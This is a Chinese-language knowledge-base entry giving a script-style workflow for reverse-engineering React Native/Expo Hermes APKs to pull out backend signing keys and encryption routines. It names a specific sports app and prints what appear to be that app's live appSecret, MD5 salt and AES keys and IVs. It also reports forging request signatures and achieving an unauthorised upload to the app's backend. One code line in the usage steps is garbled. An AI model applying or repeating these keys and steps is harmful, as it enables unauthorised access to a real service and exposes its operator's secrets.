# RN/Expo(Hermes) APK 逆向：提取后端签名密钥与加密算法

- **code**: rn-expo-hermes-apk-逆向-提取后端签名密钥与加密算法
- **kind**: script
- **category**: info-leak
- **component**: React Native / Expo (Hermes bytecode)
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 6T体育 APK（SHA256 2FB25F563323BA73BCB52B49237B28F20B08AED4C82786B37E16F87900ADFCD3）上验证：成功提取 36888 条字符串、约 250 个后端接口、4 套加密实现与 5 条密钥（appSecret adc027b1297f4c06a4573c26bb7e27a8、MD5 盐 81e443a444a3d193cc6b56f9c563e2f0、AES key=IV abcdefgabcdefg12、lmapi AES-256 key 前缀 ADKOPSTF%2003.40.51.jpeg + IV ADKOPSTF%2003.40），并按算法离线复现出可用的 ?p= 签名链接；再由提取到的接口清单实测打通未授权上传 /xxa/longm/api/v1/file/upload。
- **tags**: android,apk,react-native,hermes,逆向,签名密钥,硬编码密钥
- **created_at**: 2026-10-08T16:14:23.237Z
- **found_by**: exploit

## 描述

对以 React Native + Expo 打包、JS 以 Hermes 字节码（HBC magic c6 1f bc 03）形式存放的 Android APK，做零依赖逆向并抠出后端签名密钥/加密算法的通用流程。关键点：业务字符串与密钥不在 dex 里，而在 assets/index.android.bundle 的 Hermes 字符串表中；LoadConstString 的 StringID 在第二个 ushort 字段（可达 65535），不是第一个字节，按错字段会得出"没有引用"的错误结论；hermes-dec 读取后必须保持文件句柄打开，否则 parse_hbc_bytecode 会 seek 已关闭的文件而全量报错。同时 assets/ 里的 app.config / app.manifest 常泄漏包名、Expo projectId、更新通道。

## 用法

```
# 1) 解包（零依赖，不需要 jadx/apktool）
#   python -m zipfile -e target.apk out/
# 2) 若 out/assets/index.android.bundle 头 4 字节为 c6 1f bc 03 即为 Hermes 字节码
#   pip install hermes-dec
# 3) 全量字符串表 + 函数名索引
#   python - <<'PY'
#   from hermes_dec.parsers.hbc_file_parser import HBCReader
#   r = HBCReader(); f = open("out/assets/index.android.bundle","rb")   # 必须保持打开
#   r.read_whole_file(f)
#   S = r.strings                                  # 全量字符串（本文中 36888 条）
#   names = [str(S[h.functionName]) for h in r.function_headers]
#   import re
#   for i,n in enumerate(names):
#       if re.search(r"(?i)(sign|encrypt|decrypt|aes|md5|token|http|request|url|key)", n): print(i, n)
#   PY
# 4) 反编译指定函数（拿到算法与硬编码密钥的明文）
#   from hermes_dec.decompilation import hbc_decompiler as dc
#   st = dc.HermesDecompiler(); st.input_file=P; st.output_file=None
#   st.hbc_reader=r; st.calldirect_function_ids=set(); dc.decompile_function(st, FUNCTION_ID)
# 5) 定位"哪条字符串被哪个函数引用"（正确的操作数映射）
#   for fid,h in enumerate(r.function_headers):
#     for pi in parse_hbc_bytecode(h, r):
#       if target296.example.com in ("LoadConstString","LoadConstStringLongIndex"):
#         sid = int(pi.arg2)      # ← StringID 在第二个 ushort 字段
# 6) 顺带把 assets/*.config、assets/app.manifest、以及函数里出现的 *.json 远程配置 URL 抓下来（常常未授权可读，直接泄漏后端节点清单）
# 7) 拿到密钥后按算法离线复现签名，用真实接口验证是否被后端接受
```
